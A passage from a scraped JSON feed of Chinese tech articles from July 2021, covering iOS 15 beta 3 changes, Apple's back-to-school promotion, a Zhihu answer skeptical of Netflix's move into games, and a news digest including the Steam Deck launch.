src=\"https://cdn.sspai.com/2021/07/15/6c4b3b3456b18bc02eeda878cbc2847b.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/f0ef86c2f38b09d569712a678fff54f7.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/cd2b900f65f6d37346c04dd8230945fd.jpg\"></figure><h3>🌈🥚5 Xbox 官推与任天堂北美官推玩梗斗图，围观网友点赞过万</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/73158db2d57fd0ed8d3f266581e36d8e.png\"><figcaption>图源 <a href=\"https://twitter.com/Xbox/status/1413622439716835328\">Twitter Xbox</a></figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/f1ca896df57bcb5632d5a63e66a50b7c.jpeg\"><figcaption>如果你看不懂——玩的是这个梗</figcaption></figure><h2>游戏音乐推荐</h2>\n<p>除了分享优秀的游戏音乐，这个版块的初衷是，也许有人因为音乐从而对游戏产生兴趣（我就是）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/0dcbeaac7c63616cbc845925a8e89710.png\"></figure><p>很高兴看到有读者在上期游戏周报的评论中表示对这个新版块的认可。不过瞎玩菌更希望玩家朋友们参与到游戏音乐推荐中来。欢迎读者们在评论中推荐更多优秀的游戏音乐，并附上收听链接，我将会在后续的游戏周报中分享。</p>\n<h3>FFVII REMAKE: エアバスター (The Airbuster) - 植松伸夫, TADAYOSHI MAKINO</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/5a5e97ccb579335c09e8a49ff1397c69.jpeg\"></figure><p>本期推荐来自《最终幻想 7 重制版》中的一首原声音乐。</p>\n<p>你可以在 <a href=\"https://open.spotify.com/track/639uuHc8GEMMW1UtcHqTmj?dl_branch=1\">Spotify</a> 收听这首音乐，或者按名称在你喜欢的音乐服务中搜索。为方便你在文章页面内直接播放，下面是这首音乐的 <a href=\"https://www.bilibili.com/video/BV14A411q73Z?p=56\">B 站</a> 版本：</p> <p>说起《最终幻想》系列中游戏音乐的创作者植松伸夫，有一段有趣的轶事，被揭露在 SE 的《最终幻想 像素高清版》官方宣传视频（<a href=\"https://www.youtube.com/watch?v=9NH4Xnp_NfA\">Youtube</a> | <a href=\"https://weibo.com/1622008051/KnNP6bhQT\">微博</a>）中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/9166eb1f24b77660c2a4ca359b011be7.jpg\"><figcaption>视频 18:57 开始的「糊弄学」片段</figcaption></figure><p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67708"},{"title":"iOS 15 推出第三个测试版，这些是值得关注的新变化 | 具透","date":"2021-07-16 06:30:37","description":"\n<p>7 月 15 日凌晨，Apple 推送了 iOS 15 的第三个开发者预览版，改进了很多已有功能的细节。加上之前推送的第二个开发者预览版，iOS 15 在开始测试之后已经发生了不小的变化。那么，就让我们一起来看一看最近两个 Beta 版本新增的功能或者变化吧。</p>\n<h2>Beta 3 更新</h2>\n<p>Beta 3 更新的侧重点在 UI 交互的调整上，让我们的日常使用更加得心应手。</p>\n<h3>更多功能的音乐 App 小组件</h3>\n<p>如果说之前的音乐 App 小组件只是一个单纯的摆设，那么在 Beta 3 更新后，音乐 App 小组件终于用了一点点功能性，那就是展示当前正在播放的歌曲信息。在新的小组件上，大、中、小三个尺寸都可以展示歌曲的封面、歌名、歌手以及播放状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/902ed336d822ba9cbab3682eb5105c96\"></figure><h3>更加统一的 Safari 导航栏设计</h3>\n<p>虽然在 iOS 15 中 Safari 的导航栏已经从顶部移到了底部，但是当我点击网址时会发现导航栏又跑到了顶部。为了更加统一，在 Beta 3 中 Safari 的导航栏又经过了重新设计，现在点击网址后导航栏保留在键盘上方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/18385c7ba73af5bccb440f204a817244\"><figcaption>左：Beta 3 | 右：Beta 2</figcaption></figure><h3>全新设计的迁移和重置界面</h3>\n<p>在 Beta 3 中，设置中的迁移和重置界面经过了全新设计，将还原所有设置、还原网络设置、还原键盘词典、还原主屏幕布局、还原位置与隐私等选项放进了二级菜单里。另外，Apple 还为迁移新 iPhone 设计了一个欢迎介绍的界面，引导用户更好地完成迁移任务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/fc66f1be5cc521dc9d9ea6718905c377\"></figure><h3>在查找 App 中添加新设备</h3>\n<p>在原来的版本中，我们只能在「物品」标签页下添加新物品。而在 iOS 15 Beta 3 中，除了「物品」标签页，我们还能在「联系人」标签页和「设备」标签页下添加 AirTag 或者其它物品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/20a1f6e85e77472e03f414ff5bb8331b\"></figure><h3>更方便的 Safari 网页重新载入</h3>\n<p>在 iOS 15 中，Safari 的 UI 经历了大刀阔斧的重新设计。不过，在使用的过程中我总觉得有点别扭。一方面是导航栏从顶部移到了底部，另一方面是缺少了重新载入按钮，每一次刷新页面时需要更加繁杂的操作。</p>\n<p>在 Beta 3 中，Safari 地址栏加入了一个可以长按呼出的菜单，可以对网址进行拷贝、粘贴、加入阅读列表、添加书签、共享以及重新载入等操作，相比起之前的操作顺手了很多。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/article/f249b1e222db37009b85db6797d84f30\"></figure><h2>Beta 2 更新</h2>\n<p>除了前面介绍的 Beta 3 更新，我们还搜集整理了之前 Beta 2 上一些值得关注的变化，一起来看看吧。</p>\n<h3>SharePlay</h3>\n<p>在 WWDC 上演示的 SharePlay 功能可以让用户在 FaceTime 通话时与对方共享音乐、视频，甚至是自己的手机屏幕。不过，SharePlay 没有在首个 Beta 版本上就上线，而是直到第二个 Beta 版本才被加上。</p>\n<p>当 Facetime 通话接通后，顶部一排按钮的最后一个就是 SharePlay 功能按钮，点击即可开始使用。然后，我就可以打开音乐 App 开始音乐共享或者打开 Apple TV 开始视频共享。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/b36c929aa81ebb0c5ef8a45a44938d24.png\"></figure><p>如果你也想和小伙伴尝试一下 SharePlay，记得两个人要升级到同一个 Beta 版本，不然无法启用此功能，比如 Beta 2 虽然支持了 SharePlay 功能，但无法和安装了 Beta 3 版本的用户进行使用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/aa5efe7c3a5061ad781339be50cbd51d.jpeg\"></figure><h3>Memoji 支持换装</h3>\n<p>在皮肤、发行、眉毛、眼睛、头、鼻子、嘴巴、耳朵、鬓毛胡须、眼镜、头饰的基础上，Apple 又为 Memoji 加上了换衣服的功能，这是要在短信 App 里玩「闪耀暖暖」的节奏吗？</p>\n<p>目前 Memoji 内置了 42 套不同风格的服装，而且可以按照主要、第二种、第三种的主次顺序为每一款服装设定不同的颜色，所以即便是同一款衣服也可以搭配出不同的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/e1ced19faa3ee2acd9a9e1ba7b18b465\"></figure><h3>全新的地图 App 图标</h3>\n<p>在 WWDC 上我们看到了全新的地图 App 图标，但是在第一个 Beta 上它并没有现身，直到第二个 Beta 才姗姗来迟。与先前的图标相比，全新设计的图标配色的饱和度更高，并且去掉了 Cupertino 280 号州际公路的路牌。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/b87cfe274eac1e04ae6a54b03a24803f.png\"></figure><p>另外，地图还为导航路线加入了动画，现在呈现时不仅仅是一条路线这么简单，而是会从起点慢慢向终点延伸。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/53752b148e22fc8cb8672254e3b7c41c.gif\"></figure><h3>iPad 支持快速呼出 QuickNote</h3>\n<p>QuickNote 是 iPadOS 15 中较为重要的一项新功能。在 Beta 2 中，全局右下角快速呼出 QuickNote 的动作不再仅限 Apple Pencil 使用，现在用手指也可以呼出 QuickNote。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/068c523934c472bdc579fb259aa830f5.gif\"></figure><h3>Safari for iPadOS 重新加载按钮回归</h3>\n<p>在 Beta 2 中，Apple 还为 iPadOS 上的 Safari 重新加回了重新载入按钮，不过目前需要在外接触控板或者鼠标的情况下才能触发显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/8ab8bd0571e1a3463b7ea9fa3c8b46c7.gif\"></figure><p>如果你还发现了其它值得一提的更新内容，也欢迎在评论区补充。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，阅读更多 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\">WWDC21 专题报道</a> 👨🏻‍💻</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67742"},{"title":"买 iPad、Mac 送 AirPods，Apple 新学期优惠活动开始了","date":"2021-07-16 03:19:05","description":"\n<p>随着暑假开始，Apple 也像往年一样在 7 月份正式上线 Apple Store 教育商店返校季活动。与去年一样，从今日起至 9 月 27 日，购买指定款 Mac 或 iPad 即可免费获赠一副 AirPods 耳机，购买活动机型还可享受 8 折加购 AppleCare+ 等活动。</p>\n<p><a href=\"https://apple.pvxt.net/XVxjy\" target=\"_blank\"><strong>&gt; 前往 Apple Store 教育商店，参加新学期优惠活动</strong></a> 👨🏻‍🎓</p>\n<h2>购买哪些机型可以获赠 AirPods</h2>\n<p>本次参与赠送 AirPods 的 <strong>Apple 官网在售机型</strong>包括：</p>\n<ul>\n<li>MacBook 全系列机型，包括 13 英寸和 16 英寸 MacBook Pro、MacBook Air，Intel 芯片版本产品也能参与活动。</li>\n<li>iMac 全系列机型，包括 24 英寸 iMac、21.5 英寸 iMac、27 英寸 iMac。</li>\n<li>Mac Pro</li>\n<li>Mac mini，M1 芯片和 Intel 芯片机型均能参与活动。</li>\n<li>iPad Pro 和 iPad Air，<strong>购买第八代 iPad 和 iPad mini 无法参与此次活动</strong>。</li>\n</ul>\n<p>在官网购买时还可以留意购买页面，符合活动条件的机型在购买页面会出现横幅提示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/fda4d6e72ba69ecc62e4dfa7042f871d.png\"></figure><p>本次活动免费赠送的 AirPods 依然是不支持无线充电、只能通过 Lightning 接口充电的型号，优惠价格为 1246 元。如果想要升级为 AirPods (配无线充电盒) 或 AirPods Pro，可以选择补差价的形式进行升级。其中，AirPods (配无线充电盒) 需补 312 元，AirPods Pro 需补 753 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/5d9bc3611f961a559ecbe51de5ce139f.png\"></figure><h2>不仅送 AirPods，还有教育折扣</h2>\n<p>除了赠送 AirPods，Apple Store 教育商店提供的教育折扣依然有效，购买 Mac、iPad 以及 Apple Pencil、iPad 智能键盘等配件都有不同程度的优惠：</p>\n<ul>\n<li>\n<strong>MacBook Air：</strong>¥7,199 起（原价 ¥7,999 起）</li>\n<li>\n<strong>MacBook Pro (13 英寸)：</strong>¥ 9,199 起（原价 ¥9,999 起）</li>\n<li>\n<strong>MacBook Pro (16 英寸)：</strong>¥17,399 起（原价 ¥18,999 起）</li>\n<li>\n<strong>iMac (24 英寸)</strong>：¥9,599 起 (原价 ¥9,999 起，配备 M1 芯片)</li>\n<li>\n<strong>iMac (21.5 英寸)：</strong>¥7,999 起（原价 ¥8,399 起，配备 Intel 芯片）</li>\n<li>\n<strong>iMac (27 英寸)</strong>：¥13,639 起 (原价 ¥14,399 起，配备 Intel 芯片)</li>\n<li>Mac mini：¥4,899 起 (原价 ¥5,299 起)</li>\n<li>\n<strong>Mac Pro：</strong>¥44,799 起（原价 ¥47,999 起）</li>\n<li>\n<strong>iPad Air：</strong>¥4,399 起（原价 ¥4,799 起）</li>\n<li>\n<strong>iPad Pro (11 英寸)：</strong>¥5,799 起（原价 ¥6,199 起）</li>\n<li>\n<strong>iPad Pro (12.9 英寸)：</strong> ¥7,699 起（原价 ¥8,499 起）</li>\n<li>\n<strong>Apple Pencil (第一代)：</strong> ¥645（原价 ¥722）</li>\n<li>\n<strong>Apple Pencil (第二代)：</strong> ¥895（原价 ¥969）</li>\n</ul>\n<p>需要注意的是，虽然 Apple Store 在线商城已经没有提供直接购买 21.5 英寸版本 iMac 的入口，我们还是可以通过选择 27 英寸版本 iMac 的购买入口，再在选择机型页面切换至 21.5 英寸版本，购买这一版本 iMac 依然可享教育折扣，并获赠 AirPods，教育优惠价格 ¥7,999 起 (原价 ¥8,399 起)。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/564ca3d2bff84fa330b5a8b03b2ebe13.png\"></figure><p>此外，购买设备时加购 AppleCare+ 服务计划可以享受 8 折优惠。需要注意的是，通过教育优惠购买的设备只能享受最高 3 期分期付款服务，到店可以参加 Apple Trade In 换购计划，电脑类产品不能享受折抵换购服务。</p>\n<h2>哪些人可以参加返校季活动</h2>\n<p>虽然名为新学期优惠活动，但能参与活动的不只有在读大学生，今年结束高考的考生凭录取通知书也可以参加活动，学生家长参与活动的方式和学生一样，出示孩子的学生证或录取通知书即可。</p>\n<p>在职教师、教职员工也能参加活动享受教育优惠，除了大学老师，公⽴或私⽴幼⼉园、⼩学或中学、高等院校的任何雇员出具相关工作证明之后都可以参加活动。对了，如果你是在海外就读的中国留学生，也可以参加 Apple Store 返校季优惠活动，不过仅限在大陆地区的 Apple 在线教育商店进行购买。</p>\n<h2>购买 Final Cut Pro、订阅 Apple Music，都有教育优惠</h2>\n<p>除了硬件，如果你有视频和音频剪辑的专业需求，可以考虑购买 Apple 专门为教育而设的 <a href=\"https://apple.pvxt.net/5Vbo3\" target=\"_blank\">Pro App 教育套装</a>，以 1,298 元的价格打包购买 Final Cut Pro X、Logic Pro X、Motion 5、Compressor 4 和 MainStage 3 五款专业级 App。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/b5b2e526378f7a4a8072ededb6542036.png\"></figure><p>另外，Apple 还为高校师生提供了专门的 Apple Music 优惠，在 <a href=\"https://apple.pvxt.net/VyZvmR\" target=\"_blank\">免费试用 3 个月</a> 后，还能以每月 5 元（原价 10 元）的价格订阅使用 Apple Music。</p>\n<p>如果你是高考考生、在校大学生或者老师，近期正好有购买 Mac 和 iPad 的计划，新学期优惠活动是每年最合适的购买时机。在了解清楚上述活动规则后，可以前往 <a href=\"https://apple.pvxt.net/XVxjy\" target=\"_blank\">Apple 在线教育商店</a> 进行选购。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，获取更多 Apple 资讯 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67634"},{"title":"Netflix 将开发自主游戏平台，已聘请 Facebook 内容副总裁，有哪些行业信息值得关注？","date":"2021-07-16 03:00:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/24899f12dd48bb86191ab79febb1668c\" data-hash=\"24899f12dd48bb86191ab79febb1668c\" data-hovercard=\"p$b$24899f12dd48bb86191ab79febb1668c\">@叶佳桐</a> 邀请～</p>\n<p>两个层面。</p>\n<p>（1）业务怎么样。</p>\n<p>（2）人怎么样。</p>\n<p>-</p>\n<p>先说业务。</p>\n<p><b>简单说不看好。</b></p>\n<p>不看好的理由很简单，跟我不看好头条快手谷歌FB做好游戏一样。</p>\n<p><b>主业务与【游戏内容】业务没关系。新开的游戏业务就会成为空降高管，贵价老油子老混子的混饭场所，然后会有些高薪高学历年轻人在这里混废。</b></p>\n<p>为什么，<b>因为没必要。</b> 我自有业务做得很好，转的很好，那么我的精力始终会放在我的核心业务上面。就算我自己确实有扩新业务的压力，我的惰性和有限的注意力也会限制我把这个业务做好的成都。</p>\n<p>-</p>\n<p>为了避免被叶大揍还是多写点。<b>那我们看看Netflix做游戏有什么优劣势。</b></p>\n<p>优势当然是自己做订阅制大大的牛逼，而且在内容管理，内容孵化这块仍然是世界前列，甚至是世界第一。本身企业的执行力也还是够强。</p>\n<p>劣势其实就一点，<b>没做过游戏。</b>本身这不是大问题，但现在全球范围内游戏的竞争也很激烈，这个时候加入战局，引申的问题就很多了。</p>\n<p><b>另外一个问题是Netflix需要回答自己的游戏业务到底做什么。</b></p>\n<p>我在做投资岗的时候最烦的事情就是在notes里面写跟公司的synergy。但始终，Netflix必须要回答，到底为什么我要做游戏业务。</p>\n<p>最简单的推测是，<b>【依托于强IP资源】【做订阅制平台】</b>。这两点可拆，也可以合并。</p>\n<p>如前所述，Netflix在内容管理，内容孵化这块是世界前列。他们手上有非常多的，类型极为丰富的，高质量的IP。像是《纸牌屋》，《怪奇物语》这样的电视剧IP，或是《爱尔兰人》这类电影IP（我知道这是严肃片但黑帮背景可以做的演绎很多），都是人尽皆知的。</p>\n<p>那么IP资源在手，至少可以做IP游戏。甚至在未来再做一波影游联动。至于游戏授权之类的他们已经在做了，就不提了。</p>\n<p>订阅制平台则是集中自己的订阅制侧技术优势，做一个月付或年付的游戏平台——因为Netflix这个名头还是跟订阅制联系在一起。</p>\n<p>其实这么看来风险还是存在且显著的。</p>\n<p>做IP游戏，<b>能不能搞到好的制作团队，做出好的产品是重点。</b>话又说回来，谷歌搞了Jade Raymond为首的一大批北美3A人，也没见做出什么东西来。</p>\n<p>做订阅制平台，那么你的对手是，XGP。你说XGP太大打不过，来走移动端，那也得跟Apple Arcade或者Google Play Pass打。</p>\n<p><b>恕我直言，拿头打？</b></p>\n<p>而其他游戏公司的发展方向，比如原创自研或者发行，那么Netflix都没有任何优势，失败案例很多。亚马逊12年pi都没做出来一个，或者头条这种做出一堆_____的状态。</p>\n<p><b>恕我直言，拿头做？</b></p>\n<p>当然，毕竟我是住桥洞的，上面的人高瞻远瞩，我不配评价。现在来看，Netflix把FB这哥哥找过来，应该是找到了回答。但这是不是好回答，我们不知道。</p>\n<p>我拿以上举例的四家给出的回答来给大家评价一下：</p>\n<p>头条：<i>我是国内第一渠道，肥水不流外人田。（</i>语出头条游戏某高层）</p>\n<p>快手：<i>我要做全国第一游戏内容平台。</i>（语出近期快手游戏招人po文）</p>\n<p>谷歌：<i>我要拥抱云，做领先的第一方云游戏内容。</i></p>\n<p>FB：<i>我要拥抱虚拟现实，做领先的VR/AR内容。</i></p>\n<p>结果就是，前两家至今没成（别跟我说海贼王），后两家谷歌把内容团队砍了，专注平台；FB一直没声音。</p>\n<p>Netflix能走得更好吗？非常难说。上面几家都不比Netflix缺钱缺人。</p>\n<p>-</p>\n<p>第二个问题，人怎么样。</p>\n<p>Mike Verdu当然不是无名小卒，但他也跟传统意义上的强内容型开发者关系不大。</p>\n<p>这个哥，真的，老。程序员出身，出生是在1964年。第一份可查的工作就是创业，那是在1985年。做了12年码农之后开始去做游戏。</p>\n<p>他最出名的游戏相关经历是在Zynga期间做了Farmville。但那是2009-2012年间的事情。 此外他之前在EA作为制作人和创意总监做了《命令与征服3》以及《魔戒：中土之战2》</p>\n<p>12年离开Zynga之后，Mike Verdu开始创业，做了手游公司Tapzen，拿了腾讯的钱，被Kabam收购。收购之后就一直在当职业经理人。Kabam呆了两年，充当首席创意官，然后回到了EA管手游，治下做了一堆抽卡产品，商业化最好的是IP作品《星战：银河英雄》。19年去FB，管Oculus的内容，结果其实也没有太多能说的。</p>\n<p><b>总而言之这个哥是一个老资格开发者，本身对游戏行业应该是有认知。</b></p>\n<p><b>但是近10年，Mike老哥的成绩其实乏善可陈。他这个经历和年龄，也不是很有战斗力的样子，看起来也是去Netflix爽拿美元的。</b></p>\n<p>所以不看好。</p>\n<p>如果是IP内容的话，其实周期长，风险大。这样一个人带队，失败率其实是很高的。</p>\n<p>而比较麻烦的点是从经历看这个哥没做过发行，所以要是做平台那很难说。</p>\n<p>-</p>\n<p>我觉得还是要找准自己在世界上的位置，真的。</p>\n<p>不在其位不谋其利嘛。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21286718?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Facebook 涉足游戏发行领域有什么优势？</a><br><a href=\"http://www.zhihu.com/question/52311919?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在facebook未成气候时，腾讯为啥不及时进军美国，腾讯比facebook成立要早啊？</a><br>\n","link":"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：vivo S10 系列智能手机发布、支付宝上线宠物「防走丢」功能等","date":"2021-07-16 01:00:00","description":"\n<h2>vivo S10 系列智能手机发布</h2>\n<p>7 月 15 日，vivo 正式发布其 S10 系列智能手机，该设备采用了 7.29mm 的超薄设计，搭载天玑 1100 处理器，配备 4400 万像素主摄以及 105° 超广角镜头。本次共发布两个版本，三种颜色，售价 2799 元起。<a href=\"https://www.vivo.com.cn/vivo/s10/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/b1aec016d7cca3ed14dc0ff84f3940bd\"></figure><h2>支付宝上线宠物「防走丢」功能</h2>\n<p>7 月 15 日，支付宝正式上线宠物防走丢功能，利用了宠物鼻纹识别技术，用户可以针对已录入的宠物寻找失主，帮助失主快速找回。<a href=\"https://ur.alipay.com/8jCxu\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/5c23a57d806930cbc0ed52c88bce3c3e\"></figure><h2>微软发布新的 3D 表情符号，大眼夹正式复活</h2>\n<p>微软于 7 月 15 日正式发布全新的 3D 表情符号，新的表情符号均为 3D 设计并基于 Fluent 设计语言，同时此前呼声极高的大眼夹也因此复活并将代替以往的平面的回形针表情，目前全新设计的 #D 表情符号已经在 Flipgrid 上线，并将在今年稍晚时候登陆 Microsoft 365 等产品。<a href=\"https://www.theverge.com/2021/7/15/22578352/microsoft-new-3d-emoji-clippy-windows-office\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/d7b1d9d064a0489a56885777c1add3eb\"></figure><h2>真我 GT 大师版系列外观公布</h2>\n<p>7 月 15 日，realme 副总裁徐起通过微博公布真我 GT 大师版系列「旅行箱-灰」配色的外观设计，徐起表示该设计灵感来自旅行箱，采用素皮设计和特殊浮雕工艺。真我 GT 大师版系列将于 7 月 21 日正式发布。<a href=\"https://weibo.com/7034060236/KoP545CdL\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/67f9e4da7546d4d6f813b4fd0e24d8e4.png\"></figure><h2>Apple 2021 年高校优惠活动开始</h2>\n<p>Apple 2021 年高校优惠活动于今日正式开始，和往年一样以教育优惠购买指定款 Mac 和 iPad 即可免费获得 AirPods 一副，也可以选择把耳机升级到 AirPods Pro。今年的高校优惠活动还针对 Apple Care+ 服务计划、Apple Pencil 等 iPad 配件推出了额外优惠。本次活动截至 9 月 27 日结束。<a href=\"https://mp.weixin.qq.com/s/a54uhPsVG2KoHhF5b8egNg\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/721da41bd713bfa51ddb3977a6c4250b\"></figure><h2>Valve 掌机 Steam Deck 正式发布</h2>\n<p>7 月 15 日 Value 正式宣布推出 Steam Deck 掌机，设备采用了AMD 的 Van Gogh APU，包含一个四核 Zen 2 CPU，8 个线程和 8 个计算单元的 AMD RDNA 2 图形芯片，搭配 16GB 的 LPDDR5 内存，内置存储上提供三种不同的存储选项：64GB 的 eMMC 存储售价 399 美元，更高阶的 256GB NVMe SSD 存储售价 529美元，512GB NVMe SSD 存储售价 649 美元，支持 MicroSD 扩展。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/93983a8cafa0579bf8dcd715a1312bda\"></figure><p>控制上带有两个拇指杆以及对应的两块触控板，ABXY按钮，一个 DPad并搭载了一块 7 英寸的 720P 的触摸屏，每一侧都有两个肩部扳机，以及四个背部按钮，并且内置了一个麦克风，电池容量为 40 瓦时，对于较轻的负载可以用 7-8小时。软件方面运行的是 Valve 最新的 SteamOS，使用 Proton 作为兼容层运行 Windows 游戏，此外还支持远程游戏等 Steam 功能。掌机将会在 12 月在美国、加拿大、欧盟以及英国上市，其他地区则要等到 2022 年。<a href=\"https://www.theverge.com/platform/amp/2021/7/15/22578783/valve-steam-deck-gaming-handheld-pc?__twitter_impression=true\" target=\"_blank\">来源</a></p>\n<h2>Netflix 正在开发自己的游戏平台</h2>\n<p>7 月 15 日，根据外媒信息显示，Netflix 正在采取各种措施以此扩大其游戏业务，并聘请了前 Electronic Arts 的游戏设计师 Mike Verdu 来带领游戏团队。该游戏业务或将采用线上游玩的流媒体模式，上线时间暂未明确。<a href=\"https://www.bloomberg.com/news/articles/2021-07-14/netflix-plans-to-offer-video-games-in-expansion-beyond-films-tv\" target=\"_blank\">来源</a></p>\n<h2>WhatsApp 封测多设备信息传输功能</h2>\n<p>Facebook 于 7 月 15 日宣布，旗下的 WhatsApp 的多设备信息传输功能将进行限量封测，未来即使安装有 WhatsApp 的手机暂时无法使用，也可以在四台非手机的授权设备上正常使用 whatsApp。以往使用非手机版本 WhatsApp 都必须使用手机连接授权，而新功能将可以实现在不用设备上同步用户数据，并且确保的端到端数据加密的数据安全，但在设定和控制哪些设备于账户连接时依旧需要使用手机扫码来连接新设备。<a href=\"https://engineering.fb.com/2021/07/14/security/whatsapp-multi-device/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/3ba832b17c959b69903fa1b1be20406e\"></figure><h2>Galaxy Watch 4 或搭载 Exynos W920 处理器</h2>\n<p>SamMobile 的最新报道指出，即将发布的 Galaxy Watch 4 将搭载全新的 Exynos W920 处理器，相较此前用于 Galaxy 可穿戴设备中的 Exynos 9110 处理器将带来大幅性能提升，包括 1.25 倍 CPU 性能提升和 8.8 倍 GPU 性能提升。<a href=\"https://www.sammobile.com/news/galaxy-watch-4s-new-exynos-w920-chip-major-gains/\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67720\" target=\"_blank\">🔨 回首 7 年前，看看指挥家是怎么把 iPad 从「玩具」变成「生产力」</a></li>\n<li><a href=\"https://sspai.com/post/67728\" target=\"_blank\">🔬 具透 | 原生长截图终于上线：Android 12 Beta 3 详解</a></li>\n<li><a href=\"https://sspai.com/post/67730\" target=\"_blank\">🚀 微信 8.0.8 更新来了！多端登录、新提示音、关注成员提醒……</a></li>\n<li><a href=\"https://sspai.com/post/67734\" target=\"_blank\">🆕 新玩意 071｜少数派的编辑们最近买了啥？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67739"},{"title":"如何用科普动画、漫画的形式进行科学传播？","date":"2021-07-15 